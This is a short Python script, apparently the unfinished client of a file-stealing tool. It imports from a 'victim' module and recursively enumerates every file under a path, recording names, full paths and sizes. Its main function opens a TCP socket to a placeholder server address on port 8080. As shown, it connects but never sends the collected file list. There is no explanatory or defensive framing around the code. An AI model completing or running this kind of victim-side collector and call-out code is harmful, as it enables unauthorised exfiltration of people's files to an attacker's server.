import pathlib
from victim.file import File
import socket

import socket


def connect_to_server(public_ip, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((public_ip, port))
    return client_socket



def get_all_files(path):
    all_files = []
    dir = pathlib.Path(path)

    for item in dir.iterdir():
        if item.is_file():
            file_name = item.name
            file_path = str(item.resolve())
            file_size = item.stat().st_size
            all_files.append(File(file_name, file_path, file_size))
        else:
            all_files += get_all_files(item)

    return all_files

def main():
    print("now starting main....")
    server_public_ip = "SERVER_PUBLIC_IP"
    port = 8080
    server_sock = connect_to_server(server_public_ip, port)





if __name__ == "__main__":
    main()